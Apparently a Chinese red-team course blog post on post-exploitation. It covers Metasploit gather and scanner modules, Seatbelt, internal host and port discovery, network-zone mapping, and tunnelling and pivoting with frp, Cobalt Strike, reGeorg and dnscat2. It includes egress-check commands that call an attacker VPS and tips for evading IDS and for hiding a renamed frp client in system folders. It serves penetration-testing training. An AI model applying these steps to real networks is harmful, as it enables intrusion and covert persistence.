<p>Msf常用相关模块<br>•获取⽬标机器的分区信息： post/windows/gather/forensics/enum_drives<br>•判断是否是虚拟机： post/windows/gather/checkvm<br>•开启了什么服务： post/windows/gather/enum_services<br>•安装了什么应⽤： post/windows/gather/enum_applications<br>•查看共享: post/windows/gather/enum_shares<br>•获取主机最近的系统操作： post/windows/gather/dumplinks<br>•查看补丁： run post/windows/gather/enum_patches</p>
<p>Seatbelt<br>•<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a><br>Seatbelt.exe<br>•Seatbelt.exe -group=user -full 运行普通用户权限检查的模块 -full返回输出<br>•Seatbelt.exe -group=all 运行所有模块（需要管理员权限）<br>•Seatbelt.exe -group=system #运行检查系统相关的信息<br>•Seatbelt.exe -group=misc #运行所有其他检查（包括浏览器记录）<br>•Seatbelt.exe -group=chrome 运行浏览器历史等模块</p>
<h2 id="内-网-横-向-收-集"><a href="#内-网-横-向-收-集" class="headerlink" title="内 网 横 向 收 集"></a>内 网 横 向 收 集</h2><p>在攻陷⼀台机器后，不要⼀味的直接去抓取机器密码、去做⼀些扫描内⽹的操作，因为如果⽹内有IDS等安全设备，有可能会造成报警，丢失权限。一般来说扫描的优先级是比较低的。<br>•主机存活探测<br>•存活探测<br>•端口扫描<br>•各类服务爆破<br>•指纹识别<br>•漏洞扫描<br>•….<br>关键点:<br>•选好时间点进行扫描<br>•有选择性的选择功能点进行扫描，不用马上进行全功能扫描<br>•流量免杀与规避<br>•注意团队协助，共用一个平台，防止重复扫描。</p>
<hr>
<p><strong>内网横向信息收集—网段信息收集</strong></p>
<p>网段信息收集<br>只有找到不同网段才能进行纵向渗透，否则只能横向渗透<br>•端口扫描：用s.exe工具进行扫描，例如渗透到192.168.1.10网段，可能存在192.168.2.0/3.0网段等。只扫描网段的一个端口以探测是否存在该网段。如果有端口信息回显表示该网段存在，可以进行深入探测。常见端口：windows:445/linux:22<br>•抓包分析网络流量，看网段信息。也可以使用meterpreter做转发抓取目标所在网络流量<br>•渗透路由器、核心交换机<br>•文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。</p>
<hr>
<p><strong>内网横向信息收集—多网卡机器探测</strong></p>
<p>当我们进入内网后想要扩大战果，那我们可能首先想知道当前主机能通哪些内网段<br>•<a target="_blank" rel="noopener" href="https://github.com/shmilylty/netspy">https://github.com/shmilylty/netspy</a><br>用于寻找多网卡主机方便内网跨网段渗透避免瞎打找不到核心网<br>•<a target="_blank" rel="noopener" href="https://github.com/r35tart/GetIPinfo">https://github.com/r35tart/GetIPinfo</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142112812.png" alt="image-20220709142112812"></p>
<hr>
<p><strong>内网横向信息收集—主机存活探测</strong></p>
<p>可以使用如下命令来达到内网主机的发现。<br>查看共享资料：<br>•net view<br>查看arp表：<br>•arp -a<br>查看hosts文件：<br>•linux:cat /etc/hosts<br>•windows:type c:\Windows\system32\drivers\etc\hosts<br>查看dns缓存：<br>•ipconfig /displaydns</p>
<p>UDP协议探测<br>UDP（User Datagram Protocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。<br>UDP显著特性<br>•UDP 缺乏可靠性。UDP 本身不提供确认，超时重传等机制。UDP 数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次。<br>•.UDP 数据报是有长度的。每个 UDP 数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而 TCP 是一个字节流协议，没有任何（协议上的）记录边界。<br>•UDP 是无连接的。UDP 客户和服务器之前不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报</p>
<p>msf扫描<br>•msf &gt; use auxiliary/scanner/discovery/udp_probe<br>•msf &gt; use auxiliary/scanner/discovery/udp_sweep</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142239614.png" alt="image-20220709142239614"></p>
<p>nmap扫描<br>•nmap -sU -T5 -sV –max-retries 1 192.168.1.100 -p 500 （不推荐，理由慢）</p>
<p>ARP协议探测<br>ARP,通过解析网路层地址来找寻数据链路层地址的一个在网络协议包中极其重要的网络传输协议。根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址。<br>msf扫描<br>•use auxiliary/scanner/discovery/arp_sweep</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142332533.png" alt="image-20220709142332533"></p>
<p>基于netbios 的扫描<br>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。<br>msf扫描<br>•msf &gt; use auxiliary/scanner/netbios/nbname<br>nbtscan扫描<br>•项目地址：<a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a><br>•Windows:nbtscan-1.0.35.exe -m 192.168.1.0/24<br>•Linux：nbtscan -r 192.168.1.0/24</p>
<p>ICMP协议探测<br>TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。<br>nmap扫描<br>•nmap -sn -PE -T4 192.168.0.0/24 （扫描一个C段下的存活主机<br>powershell扫描<br>•powershell.exe ‐exec bypass ‐Command “Import‐Module ./Invoke‐TSPingSweep.ps1;<br>Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135”</p>
<p>SNMP协议探测<br>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。<br>nmap扫描<br>•nmap -sU –script snmp-brute 192.168.1.0/24 -T4<br>msf扫描<br>•msf &gt; use auxiliary/scanner/snmp/snmp_enum</p>
<hr>
<p><strong>内网横向信息收集—端口服务探测</strong></p>
<p>•auxiliary/scanner/discovery/arp_sweep #基于arp协议发现内网存活主机，这不能通过代理使用<br>•auxiliary/scanner/portscan/ack #基于tcp的ack回复进行端口扫描，默认扫描1-10000端口<br>•auxiliary/scanner/portscan/tcp        #基于tcp进行端口扫描，默认扫描1-10000端口<br>•auxiliary/scanner/discovery/udp_sweep         #基于udp协议发现内网存活主机<br>•auxiliary/scanner/discovery/udp_probe         #基于udp协议发现内网存活主机<br>•auxiliary/scanner/netbios/nbname        #基于netbios协议发现内网存活主机<br>•auxiliary/scanner/ftp/ftp_version        #发现内网ftp服务，基于默认21端口<br>•auxiliary/scanner/ssh/ssh_version        #发现内网ssh服务，基于默认22端口<br>•auxiliary/scanner/telnet/telnet_version         #发现内网telnet服务，基于默认23端口<br>•auxiliary/scanner/dns/dns_amp        #发现dns服务，基于默认53端口</p>
<hr>
<p><strong>其他内网横向信息收集—综合探测</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/uknowsec/TailorScan">https://github.com/uknowsec/TailorScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/sairson/Yasso">https://github.com/sairson/Yasso</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Adminisme/ServerScan">https://github.com/Adminisme/ServerScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br>•<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a><br>•<a target="_blank" rel="noopener" href="https://github.com/JKme/cube">https://github.com/JKme/cube</a><br>•<a target="_blank" rel="noopener" href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a><br>•Metasploit<br>•Goby<br>•Cobaltstike</p>
<hr>
<p><strong>其他内网横向信息收集—识别内网环境</strong></p>
<p>获取⽬标的主机存活信息和端⼝开放信息后，就可以尝试分析⽬标的⽹络结构，安全防御策略。一般分为以下几个区<br>•DMZ区<br>•服务区<br>•核心区<br>•测试区<br>•管理区</p>
<p>dmz区<br>在实际的渗透测试中，大多数情况下，在外围 Web 中拿到的权限在 DMZ 区。这个区域不属 于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理，DMZ 区会处在内网区能够访问 DMZ 区,而DMZ 区访问不了内网区的情况下<br>办公区<br>办公区，顾名思义，是指公司员工日常的工作区。办公区的安全防护水平一般不是高，基本防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中，攻击者在获取权限后，利用内网 信任关系，很容易扩大攻击面。一般情况下，攻击者很少会直接到达办公区。攻击者如果想进入 办公区，可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。 办公区按照系统可分为 OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒 系统、内部应用监控系统、运维管理系统等，按照网络段可分为域管理网段、内部服务器系统网 段、各部门分区网段等</p>
<p>核心区<br>核心区一般存放企业最重要的数据、文档等信息资产，如域控制器、核心生产机器等，安全设置也最为严格。根据目标开展的业务不同，相关服务器可能存在于不同的网段上。通过分析服务器上运行的服务和进程，可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网 中横向移动时，会优先查找这些主机。 核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网络段可分为各不同的 业务网段、运维监控网段、安全管理网段等</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709142832564.png" alt="image-20220709142832564"></p>
<p>办公网:<br>按照系统区分：<br>•OA系统<br>•邮件系统<br>•财务系统<br>•⽂件共享系统<br>•域控<br>•企业版杀毒系统<br>•上⽹⾏为管理系统<br>•内部应⽤监控系统</p>
<p>按照网络区分：<br>•管理⽹段<br>•内部系统⽹段<br>•按照部⻔区分的⽹段<br>•按照设备区分：<br>•个⼈电脑<br>•内⽹服务器<br>•⽹络设备<br>•安全设备</p>
<p>生产网:<br>按照系统区分：<br>•业务系统<br>•运维监控系统<br>•安全系统</p>
<p>按照网络区分：<br>•各不同的业务⽹段<br>•运维监控⽹段<br>•安全管理⽹段<br>根据⽬标开展的不同业务，对应的服务器可能存在不同的⽹段上，分析服务器上运⾏的服务和进程可以推断⽬标使⽤的运维监控管理系统和安全防护系统，可以⼤概推断出⼊侵⽬标的 IT 运维⽔平和安全防护⽔平，在接下来的⼊侵考虑,采⽤什么样的⽅法。</p>
<hr>
<p><strong>内网横向信息收集—内网拓扑图</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220709143007058.png" alt="image-20220709143007058"></p>
<hr>
<p><strong>内网横向信息收集—Web 中间件</strong></p>
<p>•Tomcat<br>•Jboss<br>•Weblogic<br>•WebSphere<br>•Glassfish</p>
<hr>
<p><strong>内网横向信息收集— 常见运维系统</strong></p>
<p>⼀般分自动化部署和运维监控相关的的⼯具。漏洞可以通过搜索引擎搜索，github搜索，ExploitDB搜索，官⽹上的安全通告获取。内⽹的通⽤类应用比较常见的问题是弱⼝令，如果⼀个管理员可以登录⼏个系统，那在这⼏个系统的账号、密码也基本上是⼀样的。<br>•Gitlab<br>•Jenkins<br>•Puppet<br>•Ansible<br>•Nagios<br>•Zabbix<br>•Cacit<br>•Splunk</p>
<hr>
<p><strong>内网横向信息收集—Web信息收集</strong></p>
<p>常见Web 应用<br>还有常⻅邮件应⽤、CMS 应⽤，在搜索引擎上查找对应的漏洞，利⽤已知漏洞进⾏攻击。<br>邮件系统:<br>⼀部分是使⽤腾讯企业邮箱、阿⾥企业邮箱的，很难有可利⽤的漏洞，另外⼀种是能独⽴部署的邮件系统，政企常⽤的邮箱应⽤：<br>•Coremail<br>•亿邮<br>•35互联<br>•TurboMail<br>•Exchange<br>•IBM Lotus</p>
<hr>
<p><strong>内网横向信息收集—数据库/缓存/消息服务</strong></p>
<p>•MySQL数据库<br>•MSSQL数据库<br>•Oracle数据库<br>•PostgreSQL数据库<br>•MongoDB数据库<br>•Redis数据库<br>•SysBase数据库<br>•DB2 数据库</p>
<hr>
<p><strong>内网横向信息收集—常⻅服务/协议</strong></p>
<p>•FTP 服务<br>•NFS 服务<br>•Samba服务<br>•SSH 服务<br>•Telnet 服务<br>•Windows远程连接<br>•VNC服务<br>•SMTP协议<br>•POP3协议<br>•DNS服务<br>•IMAP协议<br>•SNMP协议</p>
<hr>
<p><strong>内网横向信息收集—云环境</strong></p>
<p>Vmware<br>使⽤ VMware vCloud 可将现有数据中⼼内的虚拟基础架构资源池化，并将其作为基于⽬录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使⽤，Vmware vCloud Director 可为客户提供构建安全的私有云，从⽽改变 IT 部⻔交付和管理基础架构服务以及⽤户访问和使⽤这些服务的⽅式。⼀般组织中很多独⽴安装的 Esxi 形式的私有云，或独⽴部署的虚拟化系统。</p>
<p>OpenStack<br>OpenStack是基础设施即服务（IaaS）软件，让任何⼈都可以⾃⾏创建和提供云计算服务。此外，OpenStack也⽤作创建防⽕墙内的“私有云”（Private Cloud），提供机构或企业内各部⻔共享资源。<br>•漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。<br>•权限绕过漏洞<br>•信息泄露<br>•代码执⾏漏洞</p>
<p>Docker<br>•内核漏洞（Kernel exploits） 容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享⼀套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。<br>•拒绝服务攻击（Denial-of-service attacks） 所有的容器都共享了内核资源，如果⼀个容器独占了某⼀个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏⽆法⼯作（形成DoS攻击）。<br>•容器突破（Container breakouts） Linux的namespace机制是容器的核⼼之⼀，它允许容器内部拥有⼀个PID=1的进程⽽在容器外部这个进程号⼜是不⼀样的（⽐如1234）。现在问题在于如果⼀个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。<br>•有毒镜像（Poisoned images） 主要是考虑到镜像本身的安全性，没太多好说的。</p>
<hr>
<p><strong>内网横向信息收集—大数据系统</strong></p>
<p>•Elsaticsearch<br>•Hadoop<br>•Hive<br>•Sqoop<br>•Hbase<br>•Spark</p>
<hr>
<p><strong>内网横向信息收集— 重点核心业务机器</strong></p>
<p>核心业务机器<br>•高管/系统管理员/财务/人事/业务人员的个人计算机。<br>•产品管理系统服务器（仓库管理系统）。<br>•OA 办公系统服务器。<br>•财务应用系统服务器。<br>•核心产品源码服务器（对于 IT 公司，会架设自己的 SVN 或者 GIT 服务器）。<br>•数据库服务器。<br>•文件服务器/共享服务器。<br>•邮件服务器。<br>•网络监控系统服务器。<br>•其他服务器（分公司、工厂）。</p>
<h2 id="内-网-穿-透"><a href="#内-网-穿-透" class="headerlink" title="内 网 穿 透"></a>内 网 穿 透</h2><p><strong>内网穿透原理</strong></p>
<p>内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
<hr>
<p><strong>常用的隧道技术</strong></p>
<p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。<br>这些隧道技术可以按所处的协议层分层:<br>•网络层隧道:ICMP隧道等<br>•传输层隧道:TCP隧道、UDP隧道<br>•应用层隧道:HTTP、DNS、SSH等隧道</p>
<hr>
<p><strong>内网主机所有可能的出网方式</strong></p>
<p>•允许ICMP协议出网<br>网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网.<br>•允许特定的TCP或UDP协议端口出网<br>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UDP端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口.<br>•允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）<br>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制.</p>
<hr>
<p><strong>出网探测</strong></p>
<p>查看是否禁止了出站IP或者禁止了出站端口或者禁止了出站协议。<br>情况一：IP白名单<br>•目标主机设置了严格的策略，防火墙只允许目标内网机器主动连接公网指定的IP<br>情况二：出站端口限制<br>•nmap探测<br>    •nmap -sT -Pn -p- -v <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br>•masscan探测<br>    •masscan -p 80,443,8000-9000 IP –rate=10000<br>•Windows<br>    •如果RDP连接上去，可以使用图形化工具(如御剑)。<br>    •如果是webshell，可以使用fscan、nmap</p>
<p>对于禁止出站协议的情况，需要探测目标机器允许哪些协议出网。可以用以下命令判断:<br>Windows ：<br>    •ping -n 2 <a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a><br>    •ping -n 2 114.114.114.114<br>    •start <a target="_blank" rel="noopener" href="http://vpnipport/">http://vpsip:port</a><br>Linux ：<br>    •ping -c 2 <a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a><br>    •ping -c 2 114.114.114.114<br>    •curl [<a href="http://vpsip:port]">http://vpsip:port]</a><br>注：能解析<a target="_blank" rel="noopener" href="http://baidu.com/">baidu.com</a>意味着DNS可以出网，能ping通代表icmp出网。一般情况下能ping通的tcp也可以出网。在自己vps上执行nc -lvvp 80(尽量使用常规端口)，然后使用curl/start 发起请求，vps收到请求代表出网。</p>
<hr>
<p><strong>端口转发</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154033091.png" alt="image-20220711154033091"></p>
<p>在渗透测试中，当我们获得了外网服务器（如web服务器，ftp服务器，mali服务器等等）的一定权限后发现这台服务器可以直接或者间接的访问内网。此时渗透测试进入后渗透阶段，一般情况下，内网中的其他机器是不允许外网机器访问的。这时候，我们可以通过 端口转发(隧道) 或将这台外网服务器设置成为 “代理”，使得我们自己的攻击机可以直接访问与操作<br>内网中的其他机器。<br>•Netsh实现端口转发<br>•LCX实现端口转发<br>•Ssh实现端口转发</p>
<p>Netsh实现端口转发<br>Netsh 是Windows自带的命令行脚本工具，它可以建立端口映射。<br>•Netsh实现SSH到内网主机(远程端口转发)<br>•Netsh实现3389到内网主机(远程端口转发)<br>•Netsh实现本地端口转发</p>
<p>LCX实现端口转发<br>提起Lcx，可能大家并不会陌生，早些年被称为端口转发神器。Lcx有它的局限性，比如原始版本不支持linux，不免杀等等，但lcx在某些特定的场合依然发挥着重要的作用。同样基于Socket协议。<br>•LCX实现本地端口转发(Windows的场景)<br>•LCX实现本地端口转发(Linux的场景)<br>•LCX实现SSH到内网主机(公网服务器是Windows)<br>•LCX实现SSH到内网主机(公网服务器是Linux)<br>•LCX实现3389到内网主机(公网服务器是Windows)<br>•LCX实现3389到内网主机(公网服务器是Linux)</p>
<hr>
<p><strong>网络层隧道工具</strong></p>
<p>•icmpsh<br>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用<br>•icmptunnel<br>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用<br>•pingtunnel<br>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
<hr>
<p><strong>传输层隧道工具</strong></p>
<p>•netcat<br>    网络工具中的瑞士军刀，不多介绍，linux系统一般自带<br>•powercat<br>    powershell版的netcat<br>•socat<br>    具有记录转发流的功能，方便查看转发内容，需要安装<br>•netsh<br>    windows系统自带的网络配置工具</p>
<p>•lcx<br>    端口转发工具<br>•NATBypass<br>    一款lcx在golang下的实现,更好的跨平台，更完善的文档<br>•iox<br>    端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持    监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>
<hr>
<p><strong>应用层隧道工具</strong></p>
<p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等<br>•Dnscat2 不仅可以创建DNS隧道，更是C2<br>•dnscat2-powershell dnscat2的powershell客户端<br>•Dns2tcp TCP over DNS,即通过DNS隧道转发TCP连接<br>•Iodine IPv4 over DNS，即通过DNS隧道转发IPv4数据包<br>•reGeorg SOCKS over HTTP,即通过HTTP隧道转发SOCKS<br>•Neo-reGeorg 重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃<br>•reDuh TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定<br>•Tunna TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定。</p>
<p>•ABPTTS TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp<br>•EarthWorm 十分方便的多级SOCKS代理，已经永久停止更新<br>•Termite EarthWorm的升级版，已经永久停止更新<br>•Venom Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。<br>•Ssocks 正向和反向的socks工具，可执行文件的大小很小<br>•s5.go go语言编写的socks服务工具，良好的跨平台特性</p>
<hr>
<p><strong>应用层隧道工具—DNS协议</strong></p>
<p>DNS隧道原理<br>DNS协议是域名解析协议，在域名和IP地址之间进行转换，该协议也是一种请求/应答协议，也是一种可用于应用层的隧道技术。DNS，ICMP，HTTP/HTTPS等难以禁用的协议已成为攻击者控制隧道的主流隧道.DNS隧道工作的原理：在进行DNS查询时。如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上返回的可以是任意字符串，包括加密的C&amp;C指令。因为DNS在网络世界里不可或缺，所以基于可用性的考虑等，很难做到完全过滤DNS的流量。因此，攻击者可以利用它实现远程控制，文件传输等操作。</p>
<p>Dnscat2<br>dnscat2隧道有两种模式，分别是直连模式和中继模式<br>•直连模式：客户端直接指向IP地址的DNS服务器发起DNS解析请求<br>•中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢<br>一般情况下，我们使用dnscat2的中继模式要更加频繁，因为直连模式的隐蔽性要更差一些。当网段只允许白名单流量出站，同时屏蔽其他端口，传统的C&amp;C通信无法建立。在这样的情况下，可以使用DNS隐蔽隧道建立通信。</p>
<hr>
<p><strong>应用层隧道工具—HTTP协议</strong></p>
<p>HTTP Server代理用于将所有的流量转发到内网。常见的代理工具有reGeorg，meterpreter,tunna等。不出网的环境在实战中很常见，所以HTTP隧道是实战中用的最多的，HTTP隧道的优点相对于以上两个隧道的话就是稳定，ICMP丢包严重，而且非常慢，DNS也不稳定，有域名容易被溯源，他们上线都很麻烦。</p>
<hr>
<p><strong>FRP实现内网socks5反向代理</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp 是一个专注于内网穿透的高性能的反向代理 应用，支持 TCP、UDP、HTTP、HTTPS 等多 种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154658565.png" alt="image-20220711154658565"></p>
<p>frp 流量加密压缩对比</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154732523.png" alt="image-20220711154732523"></p>
<p>frp客户端与配置⽂件传到⽬标机后，把 程序名与配置⽂件进⾏修改，并放在系 统相关⽂件夹中，做到隐蔽。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154815368.png" alt="image-20220711154815368"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154828814.png" alt="image-20220711154828814"></p>
<hr>
<p><strong>CobaltStrike (socks4a)</strong></p>
<p>到已控⽬标机的Beacon下将socks代理开启<br>beacon &gt; socks 1024   #端⼝根据VPS实际情况进⾏设置</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154916207.png" alt="image-20220711154916207"></p>
<p>Link 链接，只要主链路 (出⽹机Beacon) 掉线，均掉 ！</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711154936406.png" alt="image-20220711154936406"></p>
<hr>
<p><strong>Neo reGeorg</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155007947.png" alt="image-20220711155007947"></p>
<hr>
<p><strong>冰蝎 (开socks5)</strong></p>
<p>冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这⾥同样是利⽤metasploit 探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155043604.png" alt="image-20220711155043604"></p>
<hr>
<p><strong>reduh (单端⼝转发)</strong></p>
<p>当⽬标服务器中间件等服务版本较低，reGeorg或冰蝎⻢等⽆法正常解析，就需要换⽤其它的http代理脚本。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155118681.png" alt="image-20220711155118681"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155141882.png" alt="image-20220711155141882"></p>
<hr>
<p><strong>SSH</strong></p>
<p>本地转发<br>把本地端口数据转发到远程服务器，本地服务器 作为SSH客户端及应用户端，称为正向tcp端口 加密转发。<br>远程转发<br>把远程端口数据转发到本地服务器，本地服务器 作为SSH客户端及应用服务端，称为反向tcp端 口加密转发。<br>动态转发<br>动态端口转发实际上是建立一个ssh正向加密的 socks4/5代理通道，任何支持socks4/5协议的 程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155243418.png" alt="image-20220711155243418"></p>
<hr>
<p><strong>单文件</strong></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155302808.png" alt="image-20220711155302808"></p>
<p><strong>Proxifier</strong></p>
<p>➢ 外网 socks<br>➢ 内网 socks<br>➢ 创建 代理链</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155333470.png" alt="image-20220711155333470"></p>
<p>➢ 命令行代理神器<br>➢ 多级代理<br>➢ Socks 口令</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155348617.png" alt="image-20220711155348617"></p>
<hr>
<p><strong>Metasploit</strong></p>
<p>➢ 在获取⽬标⼀个 sessions 后，可以查看IP段信息并⾃动添加路由表。<br>➢ 当知道⽬标路由表信息时，可直接添加 route，之后在metasploit继续渗透。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220711155428101.png" alt="image-20220711155428101"></p>
<hr>
<p><strong>总结</strong></p>
<p>内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。比如ABPTTS + SOCKS服务 = reGeorg 内网渗透中的内网穿透的条件，能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现tcp/udp数据包的转发，即TCP/UDP over something隧道。如果没有现成的工具，可能需要我们自己开发，隧道客户端将tcp/udp数据<br>包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可。</p>
<hr>
<p><strong>上线不出网机器–实战背景</strong></p>
<p>•获取了webshell的主机位于内网<br>•该内网主机icmp等网络层协议不能出网<br>•tcp和udp等传输层协议不能出网<br>•dns、http等应用层协议也不能出网<br>•唯一的数据通道是反向代理入网的web应用。</p>
<p><strong>上线不出网机器—Goproxy上线CS</strong></p>
